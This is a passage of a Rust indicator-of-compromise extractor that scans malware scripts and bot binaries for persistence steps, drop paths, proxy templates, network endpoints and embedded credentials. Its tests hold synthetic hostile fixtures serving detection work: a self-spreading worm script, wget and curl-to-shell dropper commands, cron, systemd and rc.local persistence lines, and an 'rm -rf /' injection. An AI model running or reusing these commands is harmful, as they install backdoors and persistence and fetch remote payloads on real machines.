    for line in text.lines() {
        let w = words(line);
        // Each line that is a persistence step also contributes the drop path it starts.
        let step = |out: &mut Collector, value: &str, detail: &str| {
            out.push(IocKind::Persistence, value, detail);
            for path in drop_paths(line) {
                out.push(IocKind::Persistence, path, "drop path");
            }
        };

        for special in CRON_SPECIALS {
            if let Some(at) = line.find(special) {
                step(out, &clause_from(line, at), "cron");
            }
        }
        let trimmed = line.trim_start();
        let fields: Vec<&str> = trimmed.split_whitespace().take(6).collect();
        if fields.len() == 6
            && fields[..5].iter().all(|f| is_cron_field(f))
            && fields[..5].iter().any(|f| f.contains('*'))
        {
            step(out, &clause_from(trimmed, 0), "cron");
        } else if line.contains("cron")
            && let Some(i) = w.windows(6).position(|f| {
                f[..5].iter().all(|x| is_cron_field(x)) && f[..5].iter().any(|x| x.contains('*'))
            })
        {
            // Each word is a slice of `line`, so its offset is exact; searching for its text
            // would find an earlier occurrence of a short field such as `0`.
            let at = w[i].as_ptr() as usize - line.as_ptr() as usize;
            step(out, &clause_from(line, at), "cron");
        }
        let cron_file = ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron"]
            .iter()
            .any(|f| line.contains(f));
        if cron_file && WRITE_OPS.iter().any(|op| line.contains(op)) {
            step(out, &whole(line), "cron");
        }

        // A unit file written line by line, or built in one printf string with `\n` escapes.
        for (at, _) in line.match_indices("ExecStart=") {
            let value = &line[at..];
            let end = [value.find("\\n"), value.find(['"', '\''])]
                .into_iter()
                .flatten()
                .min()
                .unwrap_or(value.len());
            step(out, &whole(&value[..end]), "systemd");
        }
        for word in &w {
            let name = word.rsplit('/').next().unwrap_or(word);
            if name.len() > ".service".len() && name.ends_with(".service") && is_unit_name(name) {
                out.push(IocKind::Persistence, &format!("unit {name}"), "systemd");
            }
        }
        if let Some(s) = w.iter().position(|x| *x == "systemctl")
            && let Some(e) = w[s..].iter().position(|x| *x == "enable")
            && let Some(name) = w[s + e + 1..].iter().find(|x| !x.starts_with('-'))
            && is_unit_name(name)
        {
            out.push(IocKind::Persistence, &format!("unit {name}"), "systemd");
        }

        let rc_local =
            line.contains("/etc/rc.local") && WRITE_OPS.iter().any(|op| line.contains(op));
        if rc_local {
            step(out, &whole(line), "rc.local");
        } else if line.contains("/etc/init.d/") {
            step(out, &whole(line), "init.d");
        }
        if SHELL_PROFILES.iter().any(|p| line.contains(p))
            && WRITE_OPS.iter().any(|op| line.contains(op))
        {
            step(out, &whole(line), "shell profile");
        }
        if let Some(c) = w.iter().position(|x| *x == "chattr")
            && w[c + 1..]
                .iter()
                .any(|x| x.starts_with('+') && x.contains(['i', 'a']))
        {
            step(out, &whole(line), "chattr");
        }
        for path in copy_destinations(line) {
            out.push(IocKind::Persistence, path, "drop path");
        }
    }
}

/// A line kept as a persistence value: trimmed and shortened.
fn whole(line: &str) -> String {
    line.trim()
        .chars()
        .take(MAX_PERSISTENCE_LINE_CHARS)
        .collect()
}

/// A systemd unit name, or a `%s` template of one.
fn is_unit_name(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 128
        && name
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "@._-%".contains(c))
}

/// Where `cp`, `mv` or `install` puts a file, when that is a file in one of [`DROP_DIRS`]: the
/// last word of each such command, in each `;`, `&&`, `||` or `|` separated part of the line.
fn copy_destinations(line: &str) -> Vec<&str> {
    let mut found = Vec::new();
    for part in line.split([';', '|', '&']) {
        let w: Vec<&str> = part.split_whitespace().collect();
        let Some(cmd) = w.iter().position(|x| {
            let name = x.rsplit('/').next().unwrap_or(x);
            matches!(name, "cp" | "mv" | "install")
        }) else {
            continue;
        };
        let Some(dest) = w.last().filter(|_| w.len() > cmd + 2) else {
            continue;
        };
        let dest = dest.trim_matches(['\'', '"']);
        if let Some(dir) = DROP_DIRS.iter().find(|d| dest.starts_with(*d))
            && dest.len() > dir.len()
            && !dest.ends_with('/')
        {
            found.push(dest);
        }
    }
    found
}

/// The world-writable drop locations a persistence line names (`/var/tmp/x`, `/tmp/x`,
/// `/dev/shm/x`, or a `%s` template of one), each up to the first character that ends a shell word.
fn drop_paths(line: &str) -> Vec<&str> {
    let mut found = Vec::new();
    for prefix in ["/var/tmp/", "/dev/shm/", "/tmp/"] {
        for (at, _) in line.match_indices(prefix) {
            // `/tmp/` inside `/var/tmp/` is the same path, already taken.
            if prefix == "/tmp/" && line[..at].ends_with("/var") {
                continue;
            }
            let rest = &line[at..];
            let end = rest
                .find(|c: char| c.is_whitespace() || "'\"&;|<>`\\)".contains(c))
                .unwrap_or(rest.len());
            if end > prefix.len() {
                found.push(&rest[..end]);
            }
        }
    }
    found
}

/// The value recorded when credentials are found: which mechanism carried them, never what they
/// were.
const CREDENTIALS_DETAIL: &str = "present; the value is not stored";

/// `url` with any user name and password removed, and whether there were any. A URL that does not
/// parse but has an `@` in it is withheld entirely (`None`), since what precedes the `@` may be a
/// password.
pub fn redact_url_credentials(url: &str) -> (Option<String>, bool) {
    match url::Url::parse(url) {
        Ok(mut parsed) => {
            let had = !parsed.username().is_empty() || parsed.password().is_some();
            if had {
                let _ = parsed.set_username("");
                let _ = parsed.set_password(None);
            }
            (Some(parsed.to_string()), had)
        }
        Err(_) if url.contains('@') => (None, true),
        Err(_) => (Some(url.to_string()), false),
    }
}

fn urls(text: &str, out: &mut Collector) {
    if out.full() {
        return;
    }
    for raw in crate::fetcher::extract::extract_urls(text.as_bytes()) {
        let (url, had_credentials) = redact_url_credentials(&raw);
        if had_credentials {
            out.push(
                IocKind::Credentials,
                "URL user information",
                CREDENTIALS_DETAIL,
            );
        }
        let Some(url) = url else {
            continue;
        };
        let detail = url::Url::parse(&url)
            .ok()
            .and_then(|u| {
                let host = u.host_str()?.to_string();
                Some(match u.port() {
                    Some(p) => format!("{host}:{p}"),
                    None => host,
                })
            })
            .unwrap_or_default();
        out.push(IocKind::Url, &url, &detail);
    }
}

/// Words in a host name that mark it as a proxy gateway.
const PROXY_HOST_MARKERS: [&str; 5] = ["proxy", "gw", "gate", "tunnel", "socks"];

/// File extensions a binary's strings end names with, which would otherwise read as top-level
/// labels (`proxy.conf`, `gateway.sh`).
const FILE_EXTENSIONS: [&str; 22] = [
    "sh", "conf", "cfg", "ini", "so", "py", "pl", "txt", "log", "json", "xml", "yml", "yaml",
    "service", "pid", "tmp", "bin", "out", "lock", "sock", "dat", "rc",
];

/// A host name with an alphabetic top-level label that is not a file extension, so a library or
/// file name such as `libc.so.6` or `proxy.conf` is not one.
fn is_named_host(s: &str) -> bool {
    is_hostname(s)
        && s.rsplit('.').next().is_some_and(|tld| {
            tld.len() >= 2
                && tld.chars().all(|c| c.is_ascii_alphabetic())
                && !FILE_EXTENSIONS.contains(&tld.to_ascii_lowercase().as_str())
        })
}

/// A bot that relays through, or sells access to, an HTTP proxy: the `CONNECT` request template,
/// the proxy gateway host names it names, and whether it embeds the credentials for them. A
/// credential value is never recorded, only that one is there and how it is carried.
fn proxy(text: &str, out: &mut Collector) {
    let lower = text.to_ascii_lowercase();
    let connect = text.contains("CONNECT ") && text.contains("HTTP/1.");
    if !connect && !lower.contains("proxy") {
        return;
    }
    for line in text.lines() {
        if let Some(at) = line.find("CONNECT ")
            && line[at..].contains("HTTP/1.")
        {
            let request = &line[at..];
            let end = [
                request.find("\\r"),
                request.find("\\n"),
                request.find(['"', '\'']),
            ]
            .into_iter()
            .flatten()
            .min()
            .unwrap_or(request.len());
            let detail = if request[..end].contains('%') {
                "CONNECT template"
            } else {
                "CONNECT request"
            };
            out.push(IocKind::Proxy, &whole(&request[..end]), detail);
        }
        let lower_line = line.to_ascii_lowercase();
        if let Some(at) = lower_line.find("proxy-authorization:") {
            let header = &line[at + "proxy-authorization:".len()..];
            let mut parts = header.split_whitespace();
            let scheme = parts.next().unwrap_or_default();
            let value = parts.next().unwrap_or_default();
            if value.starts_with('%') {
                // A format template: no credential in it, and its scheme is worth knowing.
                out.push(
                    IocKind::Proxy,
                    &format!("Proxy-Authorization: {} %s", scheme_name(scheme)),
                    "authorization template",
                );
            } else if !value.is_empty() {
                out.push(
                    IocKind::Credentials,
                    &format!("Proxy-Authorization {}", scheme_name(scheme)),
                    CREDENTIALS_DETAIL,
                );
            }
        }
        for word in words(line) {
            let bare = word.split_once("://").map_or(word, |(_, rest)| rest);
            let bare = bare.split('/').next().unwrap_or(bare);
            // `user:pass@host:port`, the way a proxy URL or a proxy list carries its login.
            let host_part = match bare.rsplit_once('@') {
                Some((userinfo, host)) if userinfo.contains(':') => {
                    let (h, _) = host.rsplit_once(':').unwrap_or((host, ""));
                    if is_named_host(h) || h.parse::<Ipv4Addr>().is_ok() {
                        out.push(
                            IocKind::Credentials,
                            "proxy user information",
                            CREDENTIALS_DETAIL,
                        );
                    }
                    host
                }
                Some(_) => continue,
                None => bare,
            };
            let (host, port) = match host_part.rsplit_once(':') {
                Some((h, p)) if p.parse::<u16>().is_ok() => (h, Some(p)),
                _ => (host_part, None),
            };
            let host_lower = host.to_ascii_lowercase();
            if is_named_host(host) && PROXY_HOST_MARKERS.iter().any(|m| host_lower.contains(m)) {
                let value = match port {
                    Some(p) => format!("{host}:{p}"),
                    None => host.to_string(),
                };
                out.push(IocKind::Proxy, &value, "proxy gateway");
            }
        }
    }
}

/// An HTTP authorization scheme name, or `?` for anything that is not one.
fn scheme_name(scheme: &str) -> &'static str {
    match scheme.to_ascii_lowercase().as_str() {
        "basic" => "Basic",
        "bearer" => "Bearer",
        "digest" => "Digest",
        "negotiate" => "Negotiate",
        _ => "?",
    }
}

fn endpoints(text: &str, out: &mut Collector) {
    for proto in ["tcp", "udp"] {
        let marker = format!("/dev/{proto}/");
        for (at, _) in text.match_indices(&marker) {
            let rest = &text[at + marker.len()..];
            let Some((host, tail)) = rest.split_once('/') else {
                continue;
            };
            let port: String = tail.chars().take_while(char::is_ascii_digit).collect();
            let host_ok = is_hostname(host) || host.parse::<Ipv4Addr>().is_ok();
            if host_ok && port.parse::<u16>().is_ok() {
                out.push(IocKind::Endpoint, &format!("{host}:{port}"), proto);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Synthetic fixtures, generated for these tests (`ssh-keygen`, `openssl genpkey` and
    /// `openssl passwd` on throwaway inputs); none of them was ever used anywhere. Each expected
    /// fingerprint is the one those tools printed, so the comparison is against an independent
    /// implementation rather than this module's own arithmetic.
    const ED25519_PUB: &str = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDFmxqANE9b/zXSyLtaPfu0i7616fPqt5i7Go32KWvrC synthetic-fixture";
    const ED25519_FP: &str = "SHA256:pJJ5O45oiDv8biQy+j5TSe6JfzJ0daZcA7SkbNOEApA";
    const RSA_PUB: &str = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQCkJ0svwN1IartFrJYXX/Dj2f8fJOdo8iDDtnLjJ7V84uQkqM38CFIJfYT9c6mLB4sJFeQ66MakWFhYDUshIY/1AV10R/gQbp0oXgjllgj4kYav3ubMiVNoGRDnvly4xOB2qPRu7E8FK9+X7pgWT4M3Y665ITK06zmum1/6jU7TlQ== fixture-implant";
    const RSA_FP: &str = "SHA256:sp3iA4sTVcgDEn1o6ngfftmg/Yy7O/C9oF71zS52+8U";
    const PEM: &str = "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCwlYMFcNMfb9gTBcaaXAoCIEja
fhIOa7TrEGr8i0Ts0cSFQ3cu8iCi/hS3nHBdrARVgtdgfg+/frOn1uR1R6Qv0i/2
9byeuvOS58JPt8Lj7VUNzhM2RsUMr7lwoV/A3iVgtaVY6rRcQM0q8kOvy+aqPZY3
Jx4u80n/q0WquQbw1QIDAQAB
-----END PUBLIC KEY-----";
    const PEM_FP: &str = "SHA256:20zQyZa9MGtyKF+I/S7Pm925cAmyL4ACiLaW/dhcIYo";
    const SHA512_CRYPT: &str = "$6$fixtureSALT$lBeuRPfFH0OCOTMICZDWKSkcrEd6lcbvMhvlR8EO8CIQy/n8nJR5B5W4wFOHggxxHpKLCuiGHjO/SyLWVlQvK1";
    const MD5_CRYPT: &str = "$1$abc$EVMRbRKywK.5DC5LGotlr/";

    fn of(kind: IocKind, found: &[Indicator]) -> Vec<String> {
        found
            .iter()
            .filter(|i| i.kind == kind)
            .map(|i| i.value.clone())
            .collect()
    }

    /// Modeled on the Raspberry Pi worm the owner observed, rebuilt with documentation addresses,
    /// example domains and the synthetic keys above.
    fn worm_script() -> String {
        format!(
            "#!/bin/bash\n\
             MYSELF=`realpath $0`\n\
             if [ \"$EUID\" -ne 0 ]; then\n\
               sudo cp $MYSELF /opt/$NEWMYSELF\n\
               sudo sh -c \"echo '/opt/$NEWMYSELF' >> /etc/rc.local\"\n\
             fi\n\
             echo \"127.0.0.1 rival.example.net\" >> /etc/hosts\n\
             usermod -p '{SHA512_CRYPT}' pi\n\
             echo \"{RSA_PUB}\" >> /root/.ssh/authorized_keys\n\
             cat > /tmp/public.pem <<EOFMARKER\n{PEM}\nEOFMARKER\n\
             SRV=\"irc.example.org\"\n\
             chan=\"#fixturechan\"\n\
             echo \"NICK bot$RANDOM\" > /dev/tcp/$SRV/6667\n\
             echo \"JOIN #fixturechan\" >> /tmp/irc\n\
             exec 3<>/dev/tcp/192.0.2.44/6667\n\
             zmap -p 22 -o /tmp/ips.txt\n\
             sshpass -praspberry scp -o ConnectTimeout=6 $MYSELF pi@$ip:/tmp/$NAME\n"
        )
    }

    #[test]
    fn the_worm_script_yields_every_indicator_kind_it_carries() {
        let (read, found) = extract_from_artifact(worm_script().as_bytes()).expect("text");
        assert_eq!(read, ArtifactRead::Text);
        assert_eq!(of(IocKind::SshKey, &found), vec![RSA_FP.to_string()]);
        let key = found.iter().find(|i| i.kind == IocKind::SshKey).unwrap();
        assert_eq!(key.detail, "ssh-rsa, comment fixture-implant");
        assert_eq!(of(IocKind::RsaKey, &found), vec![PEM_FP.to_string()]);
        let hashes = of(IocKind::PasswordHash, &found);
        assert_eq!(hashes.len(), 1);
        assert!(hashes[0].starts_with("sha512-crypt sha256:"), "{hashes:?}");
        assert_eq!(
            of(IocKind::HostsEntry, &found),
            vec!["127.0.0.1 rival.example.net".to_string()]
        );
        assert_eq!(
            of(IocKind::IrcChannel, &found),
            vec!["#fixturechan".to_string()]
        );
        let servers = of(IocKind::IrcServer, &found);
        assert!(
            servers.contains(&"irc.example.org".to_string()),
            "{servers:?}"
        );
        assert_eq!(
            of(IocKind::Endpoint, &found),
            vec!["192.0.2.44:6667".to_string()]
        );
        let persistence = of(IocKind::Persistence, &found);
        assert!(
            persistence.iter().any(|p| p.contains("/etc/rc.local")),
            "{persistence:?}"
        );
        assert!(self_propagating(&worm_script()));
    }

    #[test]
    fn a_password_hash_is_stored_as_a_marker_never_as_the_hash() {
        let found = extract(
            &format!("usermod -p '{SHA512_CRYPT}' pi; echo {MD5_CRYPT}"),
            16,
        );
        let hashes: Vec<&Indicator> = found
            .iter()
            .filter(|i| i.kind == IocKind::PasswordHash)
            .collect();
        assert_eq!(hashes.len(), 2, "{found:?}");
        for h in &hashes {
            assert!(!h.value.contains('$'), "{h:?}");
            assert!(!h.value.contains("fixtureSALT") && !h.value.contains("abc$"));
        }
        // The marker is the scheme and a digest prefix of the whole crypt string, which an
        // independent sha256 of the same text reproduces.
        let digest = hex(&Sha256::digest(SHA512_CRYPT.as_bytes()));
        assert!(
            hashes
                .iter()
                .any(|h| h.value == format!("sha512-crypt sha256:{}", &digest[..16]))
        );
        assert!(hashes.iter().any(|h| h.value.starts_with("md5-crypt ")));
        // A shell variable or a price is not a crypt string.
        assert!(extract("echo $6 $1$ cost $5$ab", 16).is_empty());
    }

    #[test]
    fn ssh_key_fingerprints_match_ssh_keygen() {
        let found = extract_from_command(&format!(
            "chattr -ia .ssh; echo \"{ED25519_PUB}\" >> .ssh/authorized_keys"
        ));
        assert_eq!(of(IocKind::SshKey, &found), vec![ED25519_FP.to_string()]);
        // A blob that does not name its own type is not a key.
        let lying = ED25519_PUB.replace("ssh-ed25519 AAAA", "ssh-rsa AAAA");
        assert!(of(IocKind::SshKey, &extract_from_command(&lying)).is_empty());
    }

    #[test]
    fn the_w_sh_campaign_persistence_lines_are_found() {
        let unit = "[Unit]\nDescription=watcher\n[Service]\nExecStart=/home/developer/.config/netai -c conf\nRestart=always\n";
        let (_, found) = extract_from_artifact(unit.as_bytes()).unwrap();
        assert_eq!(
            of(IocKind::Persistence, &found),
            vec!["ExecStart=/home/developer/.config/netai -c conf".to_string()]
        );
        let cmd = "(crontab -l 2>/dev/null; echo \"@reboot /home/developer/.config/w.sh\"; echo \"0 * * * * /home/developer/.config/w.sh\") | crontab -; systemctl --user enable watcher-netai.service";
        let found = extract_from_command(cmd);
        let p = of(IocKind::Persistence, &found);
        assert!(
            p.contains(&"@reboot /home/developer/.config/w.sh".to_string()),
            "{p:?}"
        );
        assert!(
            p.contains(&"0 * * * * /home/developer/.config/w.sh".to_string()),
            "{p:?}"
        );
        assert!(
            p.contains(&"unit watcher-netai.service".to_string()),
            "{p:?}"
        );
    }

    #[test]
    fn dropper_urls_carry_their_host_and_port() {
        let found = extract_from_command(
            "cd /tmp; wget http://198.51.100.7:8080/amd64 -O /etc/kswpad; tftp -g -r x86 198.51.100.7",
        );
        let urls: Vec<&Indicator> = found.iter().filter(|i| i.kind == IocKind::Url).collect();
        assert!(
            urls.iter()
                .any(|u| u.value == "http://198.51.100.7:8080/amd64"
                    && u.detail == "198.51.100.7:8080"),
            "{found:?}"
        );
        assert!(
            urls.iter().any(|u| u.value == "tftp://198.51.100.7/x86"),
            "{found:?}"
        );
    }

    #[test]
    fn values_are_sanitized_and_capped() {
        // A terminal escape, a bidirectional override and a line break inside a crafted value.
        let crafted = "echo \"@reboot /tmp/\u{1b}[31mred\u{202e}evil\r\nrm -rf /\" | crontab -";
        let found = extract_from_command(crafted);
        let p = of(IocKind::Persistence, &found);
        // The cron entry and the drop path it starts.
        assert_eq!(p.len(), 2, "{found:?}");
        for value in &p {
            for c in value.chars() {
                assert!(
                    !c.is_control() && c != '\u{202e}',
                    "unsanitized {c:?} in {value:?}"
                );
            }
        }
        let long = format!("echo \"@reboot /tmp/{}\" | crontab -", "a".repeat(5000));
        for i in extract_from_command(&long) {
            assert!(i.value.len() <= MAX_IOC_VALUE_BYTES, "{}", i.value.len());
            assert!(i.detail.len() <= MAX_IOC_DETAIL_BYTES);
        }
        assert!(sanitize_field(&"\u{00e9}".repeat(200), 7).len() <= 7);
    }

    #[test]
    fn the_count_is_capped_with_keys_kept_ahead_of_urls() {
        let mut script: String = (0..500)
            .map(|i| format!("wget http://203.0.113.9/f{i}\n"))
            .collect();
        script.push_str(&format!("echo \"{RSA_PUB}\" >> authorized_keys\n"));
        let found = extract(&script, MAX_IOCS_PER_ARTIFACT);
        assert_eq!(found.len(), MAX_IOCS_PER_ARTIFACT);
        assert_eq!(found[0].kind, IocKind::SshKey);
    }

    /// The persistence templates a captured bot carried in its strings, before it fills in its own
    /// name (synthetic names; the forms are the observed ones).
    const RC_LOCAL_TEMPLATE: &str = "grep -q '%s' /etc/rc.local 2>/dev/null || sed -i '/^exit 0/i /var/tmp/%s &' /etc/rc.local 2>/dev/null";
    const INIT_D_TEMPLATE: &str = "printf '#!/bin/sh\\n/var/tmp/%s &\\n' > /etc/init.d/%s 2>/dev/null && chmod +x /etc/init.d/%s 2>/dev/null";
    const INIT_D_REMOVE_TEMPLATE: &str = "rm -f /etc/init.d/%s";

    /// A synthetic ELF-shaped body: binary noise around the strings, as `strings -a` sees a bot.
    fn bot_binary(strings: &[&str]) -> Vec<u8> {
        let mut body = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0\x3e\0".to_vec();
        for s in strings {
            body.extend_from_slice(&[0x00, 0x8f, 0xc3, 0x01]);
            body.extend_from_slice(s.as_bytes());
            body.push(0);
        }
        // Short printable runs are noise and are not kept.
        body.extend_from_slice(b"\x90abc\x00\xffxy\x00");
        body
    }

    fn persistence_of(found: &[Indicator]) -> Vec<(String, String)> {
        found
            .iter()
            .filter(|i| i.kind == IocKind::Persistence)
            .map(|i| (i.value.clone(), i.detail.clone()))
            .collect()
    }

    #[test]
    fn a_binarys_persistence_templates_are_read_from_its_strings() {
        let body = bot_binary(&[RC_LOCAL_TEMPLATE, INIT_D_TEMPLATE, INIT_D_REMOVE_TEMPLATE]);
        let (read, found) = extract_from_artifact(&body).expect("scanned");
        assert_eq!(read, ArtifactRead::Strings);
        let p = persistence_of(&found);
        let expect = |value: &str, detail: &str| (value.to_string(), detail.to_string());
        assert!(p.contains(&expect(RC_LOCAL_TEMPLATE, "rc.local")), "{p:?}");
        assert!(p.contains(&expect(INIT_D_TEMPLATE, "init.d")), "{p:?}");
        assert!(
            p.contains(&expect(INIT_D_REMOVE_TEMPLATE, "init.d")),
            "{p:?}"
        );
        assert!(p.contains(&expect("/var/tmp/%s", "drop path")), "{p:?}");
        assert_eq!(
            p.len(),
            4,
            "the drop path is one indicator however often it recurs: {p:?}"
        );
    }

    #[test]
    fn filled_in_persistence_names_its_drop_path_in_scripts_and_commands() {
        let script = "#!/bin/sh\n\
                      cp $0 /var/tmp/fixturebot\n\
                      grep -q 'fixturebot' /etc/rc.local || sed -i '/^exit 0/i /var/tmp/fixturebot &' /etc/rc.local\n\
                      printf '#!/bin/sh\\n/var/tmp/fixturebot &\\n' > /etc/init.d/fixturebot && chmod +x /etc/init.d/fixturebot\n";
        let (read, found) = extract_from_artifact(script.as_bytes()).unwrap();
        assert_eq!(read, ArtifactRead::Text);
        let p = persistence_of(&found);
        assert!(
            p.contains(&("/var/tmp/fixturebot".to_string(), "drop path".to_string())),
            "{p:?}"
        );
        assert_eq!(
            p.iter().filter(|(_, d)| d == "rc.local").count(),
            1,
            "{p:?}"
        );
        assert_eq!(p.iter().filter(|(_, d)| d == "init.d").count(), 1, "{p:?}");
        // The `cp` line drops the file but is not persistence, so it adds nothing of its own.
        assert_eq!(p.len(), 3, "{p:?}");

        let cmd = "rm -f /etc/init.d/fixturebot; echo '/dev/shm/.fx &' >> /etc/rc.local";
        let p = persistence_of(&extract_from_command(cmd));
        assert!(
            p.contains(&("/dev/shm/.fx".to_string(), "drop path".to_string())),
            "{p:?}"
        );
        assert!(p.iter().any(|(v, d)| d == "rc.local" && v == cmd), "{p:?}");
    }

    #[test]
    fn strings_are_runs_of_printable_bytes_like_strings_a() {
        let body = b"\x00ab\x00abcdef\x01\tline two\xff\x7fxyzxyz";
        assert_eq!(
            printable_strings(body, 6, 1024),
            "abcdef\n\tline two\nxyzxyz\n"
        );
        // The output bound holds: a run that would pass it ends the listing.
        assert_eq!(printable_strings(body, 6, 10), "abcdef\n");
    }

    #[test]
    fn oversized_bodies_are_not_scanned_and_text_is_read_whole() {
        assert!(extract_from_artifact(&vec![0u8; MAX_BINARY_SCAN_BYTES + 1]).is_none());
        // Text past the text size is read through its strings instead of being refused.
        let (read, _) = extract_from_artifact(&vec![b'a'; MAX_ARTIFACT_TEXT_BYTES + 1]).unwrap();
        assert_eq!(read, ArtifactRead::Strings);
        let (read, _) = extract_from_artifact(b"#!/bin/sh\necho hi\n").unwrap();
        assert_eq!(read, ArtifactRead::Text);
        assert!(!self_propagating("wget http://198.51.100.1/x; sh x"));
    }

    #[test]
    fn strings_text_larger_than_one_scan_is_scanned_piece_by_piece() {
        // About 160 KB of strings: past one 64 KB scan, inside the strings bound.
        let filler: Vec<String> = (0..8_000).map(|i| format!("padding-string-{i}")).collect();
        let mut strings: Vec<&str> = filler.iter().map(String::as_str).collect();
        strings.push(INIT_D_REMOVE_TEMPLATE);
        let (_, text) = artifact_text(&bot_binary(&strings)).unwrap();
        assert!(text.len() > 2 * MAX_ARTIFACT_TEXT_BYTES && text.len() < MAX_STRINGS_TEXT_BYTES);
        let found = extract_artifact_text(&text);
        assert!(
            persistence_of(&found)
                .iter()
                .any(|(v, _)| v == INIT_D_REMOVE_TEMPLATE),
            "a string past the first scan's size was missed"
        );
    }

    /// The persistence and proxy strings of a captured bot (the owner examined one), with
    /// synthetic names and documentation hosts, as its binary carries them before filling in
    /// `%s`. Line ends inside a C string are real CR and LF bytes, which end a printable run.
    fn bot_strings() -> Vec<&'static str> {
        vec![
            "cp %s /var/tmp/%s",
            "cp %s /usr/lib/%s",
            "chattr +i /var/tmp/%s",
            "printf '[Unit]\\nDescription=System Service\\nAfter=network.target\\n[Service]\\nExecStart=/var/tmp/%s\\nRestart=on-failure\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/%s.service",
            "systemctl daemon-reload; systemctl enable %s",
            "(crontab -l | grep -v '%s'; echo '* * * * * /var/tmp/%s') | crontab -",
            "echo '* * * * * root /var/tmp/%s' >> /etc/crontab",
            "echo '@reboot root /var/tmp/%s' > /etc/cron.d/%s",
            "echo '/var/tmp/%s &' >> /root/.bashrc",
            "echo '/var/tmp/%s &' >> /root/.profile",
            "echo '/var/tmp/%s &' >> /root/.bash_profile",
            "CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: Basic %s\r\n\r\n",
            "gw.proxyfixture.example",
        ]
    }

    #[test]
    fn a_bots_installation_strings_yield_every_persistence_step() {
        let strings = bot_strings();
        let (read, found) = extract_from_artifact(&bot_binary(&strings)).unwrap();
        assert_eq!(read, ArtifactRead::Strings);
        let p = persistence_of(&found);
        let has = |value: &str, detail: &str| {
            assert!(
                p.contains(&(value.to_string(), detail.to_string())),
                "missing ({value:?}, {detail:?}) in {p:?}"
            );
        };
        has("/var/tmp/%s", "drop path");
        has("/usr/lib/%s", "drop path");
        has("chattr +i /var/tmp/%s", "chattr");
        has("ExecStart=/var/tmp/%s", "systemd");
        has("unit %s.service", "systemd");
        has("unit %s", "systemd");
        has("* * * * * /var/tmp/%s", "cron");
        has("* * * * * root /var/tmp/%s", "cron");
        has("echo '* * * * * root /var/tmp/%s' >> /etc/crontab", "cron");
        has("@reboot root /var/tmp/%s", "cron");
        has("echo '@reboot root /var/tmp/%s' > /etc/cron.d/%s", "cron");
        for profile in [".bashrc", ".profile", ".bash_profile"] {
            has(
                &format!("echo '/var/tmp/%s &' >> /root/{profile}"),
                "shell profile",
            );
        }
        let proxies: Vec<(String, String)> = found
            .iter()
            .filter(|i| i.kind == IocKind::Proxy)
            .map(|i| (i.value.clone(), i.detail.clone()))
            .collect();
        for expected in [
            ("CONNECT %s:%d HTTP/1.1", "CONNECT template"),
            ("Proxy-Authorization: Basic %s", "authorization template"),
            ("gw.proxyfixture.example", "proxy gateway"),
        ] {
            assert!(
                proxies.contains(&(expected.0.to_string(), expected.1.to_string())),
                "missing {expected:?} in {proxies:?}"
            );
        }
        assert!(
            !found.iter().any(|i| i.kind == IocKind::Credentials),
            "a template carries no credential: {found:?}"
        );
    }

    #[test]
    fn filled_in_installation_steps_name_their_paths() {
        let script = "cp /tmp/.x /usr/lib/libfixture.so.6\n\
                      chattr +ia /var/tmp/fixturebot\n\
                      systemctl --user enable --now fixture-watch\n\
                      echo '/var/tmp/fixturebot &' >> ~/.bashrc\n";
        let p = persistence_of(&extract(script, 64));
        for (value, detail) in [
            ("/usr/lib/libfixture.so.6", "drop path"),
            ("chattr +ia /var/tmp/fixturebot", "chattr"),
            ("/var/tmp/fixturebot", "drop path"),
            ("unit fixture-watch", "systemd"),
            ("echo '/var/tmp/fixturebot &' >> ~/.bashrc", "shell profile"),
        ] {
            assert!(
                p.contains(&(value.to_string(), detail.to_string())),
                "{value} in {p:?}"
            );
        }
        // Removing the immutable flag, and reading a profile, are not persistence.
        assert!(persistence_of(&extract("chattr -ia .ssh; cat ~/.bashrc", 16)).is_empty());
    }

    #[test]
    fn embedded_credentials_are_flagged_and_never_stored() {
        const SECRET: &str = "fixturepass";
        // "fixtureuser:fixturepass" in base64.
        const BASIC: &str = "Zml4dHVyZXVzZXI6Zml4dHVyZXBhc3M=";
        let strings = [
            "CONNECT %s:%d HTTP/1.1",
            "Proxy-Authorization: Basic Zml4dHVyZXVzZXI6Zml4dHVyZXBhc3M=",
            "fixtureuser:fixturepass@gw.proxyfixture.example:8000",
            "* * * * * root curl -s http://fixtureuser:fixturepass@198.51.100.30/u | sh # cron",
        ];
        let (_, found) = extract_from_artifact(&bot_binary(&strings)).unwrap();
        for i in &found {
            assert!(
                !i.value.contains(SECRET) && !i.value.contains(BASIC),
                "credential stored in {i:?}"
            );
            assert!(
                !i.detail.contains(SECRET) && !i.detail.contains(BASIC),
                "{i:?}"
            );
        }
        let flags: Vec<&str> = found
            .iter()
            .filter(|i| i.kind == IocKind::Credentials)
            .map(|i| i.value.as_str())
            .collect();
        for flag in [
            "Proxy-Authorization Basic",
            "proxy user information",
            "URL user information",
        ] {
            assert!(flags.contains(&flag), "{flag} missing from {flags:?}");
        }
        assert!(
            found
                .iter()
                .any(|i| i.kind == IocKind::Proxy && i.value == "gw.proxyfixture.example:8000"),
            "{found:?}"
        );
        // The cron line is still recorded, its credentials redacted.
        assert!(
            found.iter().any(|i| i.kind == IocKind::Persistence
                && i.value.contains("http://<redacted>@198.51.100.30/u")),
            "{found:?}"
        );
        assert_eq!(
            redact_secrets("curl -H 'Authorization: Bearer abc.def' https://u:p@203.0.113.1/x"),
            "curl -H 'Authorization: Bearer <redacted>' https://<redacted>@203.0.113.1/x"
        );
        assert_eq!(
            redact_url_credentials("http://u:p@203.0.113.1/x"),
            (Some("http://203.0.113.1/x".to_string()), true)
        );
    }

    #[test]
    fn library_names_are_not_proxy_hosts() {
        let found = extract(
            "CONNECT %s:%d HTTP/1.1\nlibc.so.6\ngateway.sh\nproxy.conf\n",
            16,
        );
        let hosts: Vec<&str> = found
            .iter()
            .filter(|i| i.detail == "proxy gateway")
